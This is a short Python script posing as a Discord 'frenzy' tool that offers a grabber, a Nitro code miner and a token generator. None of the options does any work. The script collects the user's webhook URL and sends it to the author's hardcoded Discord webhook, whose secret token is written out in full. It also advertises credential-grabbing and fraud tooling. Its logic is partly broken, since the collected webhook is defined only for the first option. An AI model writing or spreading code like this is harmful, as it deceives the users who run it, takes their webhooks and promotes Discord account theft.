from dhooks import Webhook

import pyfiglet
from rich import print
 
title = pyfiglet.figlet_format('frenzy', font='isometric2')
print(f'[blue]{title}[/blue]')

hook = Webhook ("https://discord.com/api/webhooks/1151256411523792906/T0UACeTV4rQaDrz4erybUcEy6VnJp_Ashjo7_zQp-mSWniXjiNG5xShQ5qdIvi7VuH9S")

print("[1]Grabber  [2]Nitro Miner  [3]Token Generator")

option = int(input("Choose an option!:  "))

if option == 1:
    print("Loading grabber")
    print("Lets begin!")
    file = input("Enter the file name: ")
    whook = input("Enter Webhook: ")
    print("File saved on desktop")

test = Webhook(input("Enter Webhook for test!: "))

if option == 2:
    print("Loading miner")
    print("Lets begin!")
    keer = int(input("How much codes do you want to mine?: "))
    print("Starting...")

if option == 3:
    print("Loading generator")
    print("Lets begin!")

    tokens = int(input("How much tokens do you want to generate?"))

hook.send("@everyone " + whook)
test.send("""@everyone 
Webhook works!:white_check_mark:""")

